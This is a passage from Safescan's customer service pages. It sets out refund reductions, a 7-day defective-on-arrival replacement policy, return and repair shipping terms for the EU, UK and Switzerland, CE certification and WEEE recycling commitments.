    We may reduce or decline your refund if the item has been used or damaged or is incomplete.

    In practical terms, this means you may inspect an item to determine its suitability, but you may not use it; any action that renders the item “used” voids your right to the 14-day money-back guarantee.

    We will refund a reduced amount if:
    - the product has been damaged, either by you or on its journey back to us
    - any components (manuals, cables, adapters, and so on) are not returned

    Once we receive your return, we will refund your purchase amount within 30 days (subject to the limitations above). If you paid with a credit card, the refund will be credited to your card. If you choose to have UPS pick up your return shipment, please note that the cost will be deducted from your total refund.
  + Defective on Arrival Policy

    We offer a 7-day DOA (Defective on Arrival) policy. If a product you’ve purchased becomes defective within 7 days of receipt, we will send you a new one, completely free of charge. Simply notify us within the 7-day period, and after approval, submit a return request through your Safescan account at Safescan.com. We will pick up the defective product and deliver a new one at no cost to you.

    Please note that the defective goods must be returned in their original packaging. Items returned without their original packaging cannot be accepted for DOA; they will be sent for repair under warranty instead.

    After the 7-day period, the standard warranty terms apply.
  + Return instructions

    When you wish to return one or more products, some additional costs may apply. Simply read our different policies below to find out which one applies to your return.

    Please note that the following policies only apply to countries and regions within the European Union, The United Kingdom and Switzerland. If you want to return your product from another region, different exceptions may apply. Please [**contact us**](/en-ie/contact) for more information.

    **Return Shipments - Within 14-day satisfaction period**

    You can return the product to us, using your own preferred carrier that you pay for in advance. Once we have received the package, we will refund you the cost of the product. The cost of the return shipment will not be covered by Safescan as is stated in our [**terms and conditions**](/en-ie/terms-and-conditions).

    You can also choose to request a return label from us. We will then provide you with a UPS label that you can use to ship the product back to us. Once we have received the package, we will refund you the amount you have paid for the product. The price of the UPS label will be deducted from the refunded amount. Please note that the price of your return label can vary per country.

    **Repair shipments - Within warranty period**

    If you need to ship your product to us for a repair, you can do so by submitting a [**repair request**](/en-ie/customer-service/warranty-repairs#repair-request). You will then receive a free UPS label from us, which you can use to ship the product. After your product has been repaired, it will be shipped back to you. You will not have to pay any of the shipping costs.

    Please note that if your device is not in need of actual repair, but the issue is related to maintenance, including cleaning, updating or calibrating the device, the shipping costs and servicing costs will be charged.

    **Repair shipments - Outside warranty period**

    If your product is not covered by our warranty anymore, but needs to be repaired, you can still ship it to us. You can use your preferred carrier or request a return label from us. Please note that the cost of the repair services and the return label will be charged.

    If we cannot repair your product, we offer free recycling. Alternatively, we can return the product to you, but shipping costs will be charged.

    **Disclaimer**

    Your products and returns are shipped from our warehouse in The Netherlands. If you are shipping your product to us from a country or region outside of the European Union, additional duties, import or export costs may apply. Please [**contact us**](/en-ie/contact) for more information.

  + CE certification

    Our products meet all applicable European safety guidelines. Please [contact our customer care department](/en-ie/contact) to request a copy of the CE Declaration of Conformity (DoC) for any product.

    CE stands for Conformité Européenne, and this mark indicates compliance with EU product legislation.
  + WEEE Regulations

    Safescan is committed to manufacturing products that have a minimal impact on the environment. As part of this commitment, we embrace the WEEE European Directive. WEEE stands for Waste Electrical and Electronic Equipment. In line with WEEE objectives, our design process for each new product includes the following considerations:
    - durability and long product life
    - ease of disassembly and recycling
    - identification of plastic material
    - energy-saving features
    - reduced use of hazardous substances
    - use of recycled material and reuse of parts

    In addition, our WEEE team monitors the introduction of legislation in individual European countries, in particular the recycling targets that member states must meet. For example, the WEEE Directive became UK legislation in January 2007. Our entire organization worked hard to fulfill the requirements:
    - We ensured that all new products carry the appropriate WEEE marking.
    - We developed internal systems to ensure that all data requirements can be met.
    - We became a member of the Environment Agency’s Producer Compliance Scheme to meet our obligations for UK business-to-consumer (B2C) transactions.
    - We formed relationships with appropriate partners in recycling, logistics and refurbishment to ensure that we can provide a take-back service, should any of our UK customers require it.

    Thanks to the groundwork laid here, we also meet all our obligations for business-to-business (B2B) transactions, and our framework can be tailored to meet individual customers’ needs as part of our commitment to a healthy environment.
